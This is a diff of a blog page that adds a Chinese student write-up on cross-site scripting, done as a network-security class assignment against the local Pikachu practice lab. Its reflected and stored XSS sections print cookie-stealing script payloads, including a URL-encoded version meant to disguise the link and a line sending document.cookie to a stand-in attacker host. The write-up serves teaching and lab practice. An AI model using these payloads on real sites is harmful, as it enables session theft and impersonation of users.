@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="index,follow">
-  <link rel="canonical" href="http://example.com/"/>
+  
+  <link rel="canonical" href="http://example.com/2020/10/26/web_xss/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,16 +34,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>x1ngg3's blog</title>
-  <meta name="keywords" content="">
-  <meta desc name="description" content="x1ngg3's blog - John Doe - x1ngg3's blog">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="x1ngg3&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
+  <title>XSS - x1ngg3's blog</title>
+  <meta name="keywords" content="xss,null">
+  <meta desc name="description" content="网络安全课作业需要，菜鸡被迫了解一下xss。 - John Doe - x1ngg3's blog">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="http://example.com/2020/10/26/web_xss/index.html">
 <meta property="og:site_name" content="x1ngg3&#39;s blog">
+<meta property="og:description" content="网络安全课作业需要，菜鸡被迫了解一下xss。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2020-10-26T00:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-27T12:55:52.628Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2100,7 +2105,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2165,7 +2170,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2432,385 +2437,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div id="l_body">
       <div id="l_cover">
   
-    
-      <div class="cover-wrapper  dock" id='full'>
-        
-  <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
-
-<div class='cover-body'>
-  <div class='top'>
-    
-    
-      <p class="title">X1ngg3</p>
-    
-    
-  </div>
-  <div class='bottom'>
-    <div class='menu navigation'>
-      <div class='list-h'>
-        
-          
-            <a href="/v4/getting-started/"
-              
-              
-              active-action="action-v4getting-started">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f5c3.svg'><p>文档</p>
-            </a>
-          
-            <a href="/faqs/"
-              
-              
-              active-action="action-faqs">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f516.svg'><p>帮助</p>
-            </a>
-          
-            <a href="/examples/"
-              
-              
-              active-action="action-examples">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f396.svg'><p>示例</p>
-            </a>
-          
-            <a href="/contributors/"
-              
-              
-              active-action="action-contributors">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f389.svg'><p>社区</p>
-            </a>
-          
-            <a href="/archives/"
-              
-              
-              active-action="action-archives">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f4f0.svg'><p>博客</p>
-            </a>
-          
-            <a target="_blank" rel="noopener" href="https://github.com/volantis-x/hexo-theme-volantis/"
-              
-              
-              active-action="action-https:githubcomvolantis-xhexo-theme-volantis">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f9ec.svg'><p>源码</p>
-            </a>
-          
-        
-      </div>
-    </div>
-  </div>
-</div>
-
-        <div id="scroll-down"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
-      </div>
-    
-  
 </div>
 
       <div id="safearea">
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  
-  <section class="post-list">
-    
-      
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/02/atest/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/07/02/atest/"  itemprop="url">
-        test--
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>测试博客是否还活着</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-07-02T00:00:00+08:00">2022-07-02</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/test/">test</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/test/" itemprop="url"><span itemprop="name">test</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/07/02/atest/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/01/pwn_fastbin-attack/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/11/01/pwn_fastbin-attack/"  itemprop="url">
-        Fastbin Attack related
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>我提莫的心态崩了啊 ಥ_ಥ</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-11-01T00:00:00+08:00">2020-11-01</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/01/pwn_fastbin-attack/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/27/pwn_overlap/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/27/pwn_overlap/"  itemprop="url">
-        water one water
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>Chunk_extend &amp; Overlap</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-27T08:00:00+08:00">2020-10-27</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/27/pwn_overlap/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/27/pwn_uaf/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/27/pwn_uaf/"  itemprop="url">
-        uaf
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>ヽ(✿ﾟ▽ﾟ)ノ</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-27T08:00:00+08:00">2020-10-27</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/27/pwn_uaf/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/26/web_xss/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="x1ngg3's blog">
@@ -2820,382 +2453,318 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/26/web_xss/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         XSS
-      </a>
-    </h2>
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
   
-  <div class='md article-desc' itemprop="articleBody">
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/WEB/">WEB</a>
     
-      <p>网络安全课作业需要，菜鸡被迫了解一下xss。</p>
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/WEB/" itemprop="url"><span itemprop="name">WEB</span></a>
+      </span>
     
   </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-26T08:00:00+08:00">2020-10-26</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/WEB/">WEB</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/WEB/" itemprop="url"><span itemprop="name">WEB</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/26/web_xss/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2020-10-26T08:00:00+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Oct 26, 2020</p>
+  </a>
 </div>
 
-          </div>
+          
         
-      
+          
+            
+
+
+
+          
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/24/algorithm_review/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/2020/10/24/algorithm_review/">
-        <img itemprop="image" class='headimg' alt="Algorithm_review" src='https://i.loli.net/2020/11/16/DktlaEendNRYTij.png'/>
-      </a>
-    </div>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/24/algorithm_review/"  itemprop="url">
-        Algorithm_review
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>算法课复习~~</p>
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <p>网络安全课作业需要，菜鸡被迫了解一下xss。</p>
+<span id="more"></span>
+
+<script>alert("X1NGG3")</script>
+
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先下载好这三个工具：<strong>phpstudy + pikachu + firefox</strong></p>
+<p>以及一个好用的编辑器来方便查看和修改源码</p>
+<h4 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h4><p>这里使用到了Nginx和mysql服务</p>
+<p><strong>值得注意的是，如果你在之前下载过mysql，那小皮的服务打开会有问题，原因是3306端口被占用</strong>。解决方案是，在开机启动服务项里面把mysql的服务给禁止，这里我是在火绒里面用的启动项管理来禁止的。</p>
+<p><img src="https://i.loli.net/2020/10/26/DTmQfqKPpGrU7lW.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/26/DTmQfqKPpGrU7lW.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201026105822423"></p>
+<h4 id="pikachu-master"><a href="#pikachu-master" class="headerlink" title="pikachu-master"></a>pikachu-master</h4><p>解压缩之后直接将整个文件夹放在<strong>phpstudy_pro\WWW</strong>目录下即可。</p>
+<h5 id="文件配置"><a href="#文件配置" class="headerlink" title="文件配置"></a>文件配置</h5><p>在<strong>phpstudy_pro\WWW\pikachu-master\inc\config.inc.php</strong>页面下，按照注释修改就可以了，这里服务器地址就是本地。</p>
+<h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><p>浏览器输入<strong>127.0.0.1&#x2F;pikachu-master，芜湖，起飞</strong></p>
+<h3 id="服务器与攻击者"><a href="#服务器与攻击者" class="headerlink" title="服务器与攻击者"></a>服务器与攻击者</h3><p>现在我们已经有了小皮部署在本地的127.0.0.1来作为服务器，现在我们再搭建一个作为攻击者，二者都包含pikachu-master，这么做是为了区分开攻击者与服务器。</p>
+<p><img src="https://i.loli.net/2020/10/28/9eJ1VQi7cHlSgPI.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/28/9eJ1VQi7cHlSgPI.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201028192829429"></p>
+<p>搭建完成之后就是这样：</p>
+<p><img src="https://i.loli.net/2020/10/28/jepsX9hmltRcFTS.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/28/jepsX9hmltRcFTS.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201028192908419"></p>
+<p><strong>hack.io里面放的也还是一个一摸一样的pikachu</strong></p>
+<p><img src="https://i.loli.net/2020/10/28/xsPjUKAWrpJ18QB.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/28/xsPjUKAWrpJ18QB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201028193033839"></p>
+<p>Now, have fun with xss!</p>
+<h3 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</span><br><span class="line">    1.反射性XSS;</span><br><span class="line">    2.存储型XSS;</span><br><span class="line">    3.DOM型XSS;</span><br><span class="line"></span><br><span class="line">XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</span><br><span class="line">XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</span><br><span class="line">形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</span><br><span class="line">因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:</span><br><span class="line">  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</span><br><span class="line">  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p><strong>反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。</strong></p>
+<p>反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。</p>
+<p>比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 “反射”到受害者的浏览器上，从而浏览器就执行了该脚本。</p>
+<p><strong>因此反射型XSS的攻击步骤如下：</strong></p>
+<ol>
+<li>攻击者在url后面的参数中加入恶意攻击代码。</li>
+<li>当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。</li>
+<li>用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。</li>
+<li>攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户<br>的行为，调用目标网站接口执行攻击等操作。</li>
+</ol>
+<h4 id="get型XSS"><a href="#get型XSS" class="headerlink" title="get型XSS"></a>get型XSS</h4><p>与post型不同的是：<strong>GET把参数包含在URL中，POST通过request body传递参数。</strong></p>
+<p>所以一般将带有XSS的URL伪装后发给目标即可。</p>
+<p>这里看一下pikachu上面的例子：</p>
+<p><img src="https://i.loli.net/2020/10/28/Sd1cs8NX3uoaAZq.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/28/Sd1cs8NX3uoaAZq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201028191537189"></p>
+<p><strong>可以看到，对于输入”james”，我们的输入被原封不动的嵌在了p标签里面，如果我们输入一串正确的JS代码的话，那就可以被浏览器正确的执行。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入&quot;&lt;script&gt;alert(&quot;X1NGG3&quot;)&lt;/script&gt;&quot;进行测试：</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/10/28/ILPlqewJV7SfFKs.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/28/ILPlqewJV7SfFKs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201028192029054"></p>
+<p>可以看到我们payload在浏览器上正确的执行了，那我们就可以通过将带有XSS的URL来发送给目标诱导其点击来获取其cookie信息了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://127.0.0.1/pikachu-master/vul/xss/xss_reflected_get.php?message=&lt;script&gt;document.location+=+&#x27;http://127.0.0.1/hack.io/pikachu-master/pkxss/xcookie/cookie.php?cookie=&#x27;+++document.cookie;&lt;/script&gt;&amp;submit=submit</span><br><span class="line">编码伪装：</span><br><span class="line">http://127.0.0.1/pikachu-master/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%2Fhack.io%2Fpikachu-master%2fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>其中，document.location是让让目标可以重定向到当前页面，以免让其察觉到被攻击。</p>
+<p>在浏览器中输入该网址，然后查看后台，可以看到，攻击成功了。</p>
+<p><strong>关于如何查看后台，可以参考文章末尾给出的参考博客。</strong></p>
+<p><img src="https://i.loli.net/2020/10/28/gSYFUerZBu2EsAC.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/28/gSYFUerZBu2EsAC.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201028193602640"></p>
+<h4 id="post型xss"><a href="#post型xss" class="headerlink" title="post型xss"></a>post型xss</h4><p>思路与get型差不多，但是由于我们不能直接把恶意代码嵌入到url中，所以我们需要自己来搭一个恶意网站站点，然后放一个post表单，将这个post表单发送给受害者，诱导受害者点击，然后post表单会自动向漏洞服务器提交一个Post请求，实现受害者帮我们提交Post的目的。</p>
+<p><img src="https://i.loli.net/2020/10/30/XNgiJQ5bw4YVhyl.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/30/XNgiJQ5bw4YVhyl.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="xss_post"></p>
+<p>这个POST表单页面位于 WW&#x2F;pikachu-master&#x2F;pkxss&#x2F;xcookie 下名为 post.html 的文件</p>
+<p><img src="https://i.loli.net/2020/10/30/lAZ9YEfwyHNj7Rg.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/30/lAZ9YEfwyHNj7Rg.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201030094524078"></p>
+<p>重定向</p>
+<p><img src="https://i.loli.net/2020/10/30/NEBkICurv8yRMjb.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/30/NEBkICurv8yRMjb.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201030094546545"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://127.0.0.1/hack.io/pikachu-master/pkxss/xcookie/post.html</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><strong>存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</strong></p>
+<p>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&quot;www.gongji.com?param=&quot;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。</p>
+<p><strong>因此存储型XSS的攻击步骤如下：</strong></p>
+<ol>
+<li>攻击者将恶意代码提交到目标网站数据库中。</li>
+<li>用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。</li>
+<li>用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。</li>
+<li>那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该<br>cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"> &lt;script&gt;document.location+=+&#x27;http://127.0.0.1/hack.io/pikachu-master/pkxss/xcookie/cookie.php?cookie=&#x27;+++document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/logsharing/p/8448446.html">GET和POST两种基本请求方法的区别</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">HTTP 方法：GET 对比 POST</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tugenhua0707/p/10909284.html">web安全之XSS攻击原理及防范</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11556221.html">Pikachu漏洞练习平台实验——XSS（二）</a></p>
+
+  </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-24T08:00:00+08:00">2020-10-24</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/Algorithm/">Algorithm</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/Algorithm/" itemprop="url"><span itemprop="name">Algorithm</span></a>
-            </span>
-          
-        
-      </div>
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2020/10/24/algorithm_review/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
